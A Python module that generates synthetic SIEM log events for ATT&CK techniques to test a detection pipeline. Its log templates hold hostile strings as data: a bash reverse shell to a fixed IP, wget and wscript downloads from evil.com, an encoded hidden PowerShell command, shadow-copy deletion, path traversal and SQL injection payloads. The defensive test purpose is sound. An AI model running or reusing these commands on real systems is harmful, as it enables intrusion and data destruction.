"""
src/logs/simulator.py
~~~~~~~~~~~~~~~~~~~~~
Simulates realistic SIEM log events for specified MITRE ATT&CK techniques.

Generated events are used in the absence of real log data to demonstrate
the evidence-grounding pipeline.  Each event includes a ``is_noise`` flag
so evaluation code can distinguish true signal from benign/irrelevant events.

Supported techniques
--------------------
- T1190  Exploit Public-Facing Application
- T1078  Valid Accounts
- T1059  Command and Scripting Interpreter
- T1486  Data Encrypted for Impact
- T1021  Remote Services
"""

from __future__ import annotations

import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any


# ---------------------------------------------------------------------------
# Log event templates keyed by ATT&CK technique ID.
# Each template is a list of (event_type, description, raw_log) tuples.
# ---------------------------------------------------------------------------
_TEMPLATES: dict[str, list[tuple[str, str, str]]] = {
    "T1190": [
        (
            "web_exploit_attempt",
            "HTTP request with exploit payload targeting public-facing application",
            'src=203.0.113.99 dst={asset_ip} method=POST uri="/cgi-bin/admin.cgi" '
            'payload="../../../../etc/passwd" status=200 user_agent="curl/7.88"',
        ),
        (
            "web_exploit_attempt",
            "SQL injection attempt detected on login endpoint",
            'src=198.51.100.44 dst={asset_ip} method=POST uri="/api/login" '
            "payload=\"' OR 1=1--\" status=500",
        ),
        (
            "waf_alert",
            "WAF blocked request matching CVE signature",
            'src=185.220.101.3 dst={asset_ip} rule_id=990001 action=BLOCK '
            'msg="Remote Command Execution attempt"',
        ),
        (
            "process_spawn",
            "Web server process spawned unexpected child process",
            "ppid=apache2 pid=31337 cmd=\"/bin/bash -c 'wget http://evil.com/malware.sh'\"",
        ),
        (
            "file_write",
            "Web shell written to public web root",
            "path=/var/www/html/shell.php size=2048 user=www-data action=CREATE",
        ),
    ],
    "T1078": [
        (
            "auth_success",
            "Successful authentication from unusual geography",
            "user={username} src=185.220.101.50 dst={asset_ip} proto=SSH "
            "country=RU geo_anomaly=TRUE session_id=abc123",
        ),
        (
            "auth_failure_spike",
            "Multiple failed login attempts followed by success (credential stuffing)",
            "user={username} src=203.0.113.77 dst={asset_ip} failures=47 "
            "final_result=SUCCESS time_window=120s",
        ),
        (
            "account_added_to_group",
            "Service account added to privileged group outside change window",
            "account={username} group=Domain Admins initiator=SYSTEM "
            "change_window=FALSE timestamp={ts}",
        ),
        (
            "token_reuse",
            "Authentication token replayed from different IP",
            "token_hash=abc123def user={username} original_ip=10.10.1.5 "
            "reuse_ip=203.0.113.88 delta_seconds=12",
        ),
        (
            "off_hours_logon",
            "Interactive logon outside business hours",
            "user={username} src={asset_ip} logon_type=Interactive "
            "hour=03 day=Sunday alert=off_hours",
        ),
    ],
    "T1059": [
        (
            "powershell_execution",
            "PowerShell with encoded command and bypass flags",
            'cmd="powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcA..." '
            "parent=winword.exe pid=4421",
        ),
        (
            "script_execution",
            "Suspicious script executed from temp directory",
            "path=C:\\Users\\Public\\update.vbs interpreter=cscript.exe "
            "size=8192 entropy=7.2",
        ),
        (
            "bash_reverse_shell",
            "Outbound connection initiated by bash interpreter",
            "pid=5500 cmd=\"bash -i >& /dev/tcp/185.220.101.3/4444 0>&1\" "
            "src={asset_ip} dst=185.220.101.3:4444",
        ),
        (
            "macro_execution",
            "Office macro spawned cmd.exe",
            "parent=excel.exe child=cmd.exe args='/c whoami && net user' "
            "file=Q4_Report.xlsm",
        ),
        (
            "wscript_download",
            "wscript.exe downloaded file from internet",
            "process=wscript.exe url=http://evil.com/payload.js "
            "dst_ip=185.220.101.3 bytes=45000",
        ),
    ],
    "T1486": [
        (
            "mass_file_rename",
            "Mass file rename with suspicious extension detected",
            "process=svchost.exe files_renamed=4820 new_ext=.locked "
            "dir=C:\\Users elapsed_seconds=12",
        ),
        (
            "shadow_copy_deletion",
            "Volume Shadow Copy Service stopped and shadow copies deleted",
            "cmd=\"vssadmin.exe delete shadows /all /quiet\" user=SYSTEM "
            "result=SUCCESS",
        ),
        (
            "ransom_note_created",
            "Ransom note file created in multiple directories",
            "filename=README_TO_DECRYPT.txt dirs_affected=312 "
            "process=unknown.exe hash=d41d8cd98f00b204e9800998ecf8427e",
        ),
        (
            "backup_service_stopped",
            "Windows Backup service forcibly stopped",
            "service=wbengine action=STOP initiator=cmd.exe "
            "user=Administrator method=sc_stop",
        ),
        (
            "high_cpu_crypto",
            "Unusual CPU spike consistent with encryption activity",
            "process=system.exe cpu_pct=98 duration_seconds=120 "
            "io_write_mb=2048 io_read_mb=2050",
        ),
    ],
    "T1021": [
        (
            "rdp_lateral_movement",
            "RDP connection to internal host from unusual source",
            "src={asset_ip} dst=10.10.0.5:3389 user={username} "
            "proto=RDP new_host=TRUE session_id=rdp-7742",
        ),
        (
            "ssh_key_added",
            "New SSH authorised key added to root account",
            "file=/root/.ssh/authorized_keys action=APPEND "
            "key_fingerprint=SHA256:abc123 user=root",
        ),
        (
            "psexec_service",
            "PsExec service created on remote host",
            "src={asset_ip} dst=10.10.3.30 service=PSEXESVC "
            "user={username} share=ADMIN$",
        ),
        (
            "smb_admin_share",
            "Administrative share accessed from non-admin workstation",
            "src={asset_ip} dst=10.10.3.30 share=C$ user={username} "
            "proto=SMB2 access=READ|WRITE",
        ),
        (
            "winrm_execution",
            "WinRM used to execute command on remote system",
            "src={asset_ip} dst=10.10.0.5:5985 proto=WINRM "
            "cmd='Invoke-Command -ScriptBlock {whoami}' user={username}",
        ),
    ],
}

# Noise events — generic, unrelated to any specific technique
_NOISE_TEMPLATES: list[tuple[str, str, str]] = [
    (
        "scheduled_task",
        "Routine scheduled maintenance task executed",
        "task=DiskCleanup user=SYSTEM trigger=daily result=SUCCESS",
    ),
    (
        "software_update",
        "Software update check initiated",
        "process=updater.exe url=https://update.vendor.com status=304",
    ),
    (
        "user_logon",
        "Normal business-hours workstation logon",
        "user=jsmith src=10.20.5.10 logon_type=Interactive hour=09 day=Monday",
    ),
    (
        "dns_query",
        "Routine DNS query to known CDN",
        "query=cdn.jsdelivr.net qtype=A response=104.21.0.0 ttl=300",
    ),
    (
        "antivirus_scan",
        "Scheduled antivirus scan completed",
        "engine=ClamAV files_scanned=42000 threats_found=0 duration_s=300",
    ),
]


class LogSimulator:
    """Generates synthetic SIEM log events for ATT&CK technique scenarios.

    Parameters
    ----------
    seed:
        Optional random seed for reproducibility.
    """

    def __init__(self, seed: int | None = None) -> None:
        if seed is not None:
            random.seed(seed)

    def generate_scenario(
        self,
        technique_id: str,
        asset_id: str,
        n_events: int = 5,
        inject_noise: bool = True,
        asset_ip: str = "10.0.0.1",
        username: str = "admin",
    ) -> list[dict[str, Any]]:
        """Generate a list of log events for a technique/asset pairing.

        Parameters
        ----------
        technique_id:
            ATT&CK technique ID (e.g. ``"T1190"``).
        asset_id:
            Asset identifier string.
        n_events:
            Number of *signal* events to generate.
        inject_noise:
            If ``True``, add 1–3 unrelated noise events to the output.
        asset_ip:
            IP address of the asset (substituted into log templates).
        username:
            Username to inject into log templates.

        Returns
        -------
        list[dict]
            Sorted by ``timestamp`` ascending.
        """
        templates = _TEMPLATES.get(technique_id, [])
        if not templates:
            # Fallback for unknown technique — generic security alert
            templates = [
                (
                    "security_alert",
                    f"Security event associated with technique {technique_id}",
                    f"technique={technique_id} asset={asset_id} severity=HIGH",
                )
            ]

        now = datetime.now(tz=timezone.utc)
        events: list[dict[str, Any]] = []

        # --- Signal events ---
        for i in range(n_events):
            template = templates[i % len(templates)]
            evt_type, description, raw_log_tpl = template

            ts = now - timedelta(minutes=random.randint(1, 60 * 24 * 7))
            raw_log = raw_log_tpl.format(
                asset_ip=asset_ip, username=username, ts=ts.isoformat()
            )
            events.append(
                {
                    "event_id": str(uuid.uuid4()),
                    "timestamp": ts.isoformat(),
                    "asset_id": asset_id,
                    "source_ip": f"203.0.113.{random.randint(1, 254)}",
                    "event_type": evt_type,
                    "technique_id": technique_id,
                    "description": description,
                    "raw_log": raw_log,
                    "is_noise": False,
                }
            )

        # --- Noise events ---
        if inject_noise:
            n_noise = random.randint(1, 3)
            noise_pool = random.sample(_NOISE_TEMPLATES, min(n_noise, len(_NOISE_TEMPLATES)))
            for nt in noise_pool:
                evt_type, description, raw_log = nt
                ts = now - timedelta(minutes=random.randint(1, 60 * 24 * 7))
                events.append(
                    {
                        "event_id": str(uuid.uuid4()),
                        "timestamp": ts.isoformat(),
                        "asset_id": asset_id,
                        "source_ip": f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
                        "event_type": evt_type,
                        "technique_id": "",  # noise has no technique
                        "description": description,
                        "raw_log": raw_log,
                        "is_noise": True,
                    }
                )

        # Sort chronologically
        events.sort(key=lambda e: e["timestamp"])
        return events
